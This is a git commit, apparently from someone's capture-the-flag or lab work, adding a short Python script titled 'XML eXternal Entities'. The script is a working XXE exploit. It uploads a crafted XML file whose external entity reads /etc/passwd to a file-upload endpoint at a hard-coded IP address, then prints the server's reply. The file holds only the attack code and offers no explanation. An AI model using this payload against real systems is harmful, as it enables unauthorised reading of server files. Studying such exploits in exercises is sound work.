285097739e029a06e8a72e9108cd20fd5d157106
hingston <will.hingston@gmail.com>
2018-07-07 10:14:15 +0930

    Finished

---
+++ Finished/XML eXternal Entities.py
@@ -0,0 +1,13 @@
+import requests
+
+r = requests.post(
+    'http://43.241.202.47:3003/file-upload',
+    files={
+        'file': ('exploit.xml',
+                 # https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection
+                 '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [\n  <!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">\n]><creds><user>&xxe;</user><pass>mypass</pass></creds>')
+    }
+)
+
+print("Status code:",str(r.status_code) + "\n")
+print(r.text)
